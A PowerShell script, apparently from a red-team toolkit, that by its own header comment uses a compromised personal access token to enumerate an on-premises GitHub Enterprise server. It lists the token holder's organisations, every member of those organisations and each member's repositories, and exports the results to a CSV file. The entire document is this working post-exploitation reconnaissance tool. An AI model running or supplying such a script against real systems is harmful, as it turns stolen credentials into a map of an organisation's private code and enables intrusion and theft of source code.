#
# Script to list all repos from an on-prem Github server via REST API using a compromised PAT
#

# PAT
$token = ""

# token and base URL vars
$baseurl = 'https://github.example.com/api/v3'
$base64token = [System.Convert]::ToBase64String([char[]]$token)

# basic auth and other required headers
$headers = @{
	Authorization = ('Basic ' + $base64token);
	Accept = 'application/vnd.github.inertia-preview+json'}


# Output file
$file = $env:userprofile + "\Desktop\github_repos_" + $token.Substring(0,5) + ".csv"

$orgs = Invoke-RestMethod -Method GET -Headers $headers -Uri ($baseurl + '/user/orgs')
$allusers = @()
$allrepos = @()

#Write-Host "`n`n"
#Write-Host "[+] Orgs:`n`n"
#$orgs | ft

foreach ($org in $orgs) {
	$users = Invoke-RestMethod -Method GET -Headers $headers -Uri ($baseurl + '/orgs/' + $org.login + '/members') -FollowRelLink # Reqs Pwsh Core
	$allusers += $users
	
	$repos = Invoke-RestMethod -Method GET -Headers $headers -Uri $org.repos_url
	$allrepos += $repos
}

$uniqueusers = $allusers | Sort-Object -Property login -Unique

#Write-Host "`n`n"
#Write-Host "[+] Users:`n`n"
#$uniqueusers | ft

foreach ($user in $uniqueusers) {
	
	if ($user.repos_url.GetType().BaseType.Name -eq "Array")
	{	
		$repos = Invoke-RestMethod -Method GET -Headers $headers -Uri $user.repos_url[0] # Fixes bug if multiple user repo_urls present, gets current
		$allrepos += $repos
	}
	else
	{	
		$repos = Invoke-RestMethod -Method GET -Headers $headers -Uri $user.repos_url
		$allrepos += $repos
	}
}

Write-Host "`n`n"
Write-Host "[+] Repos:`n`n"
$allrepos | ft

# Export
$allrepos | Export-CSV -Path $file -Notypeinformation -Encoding UTF8
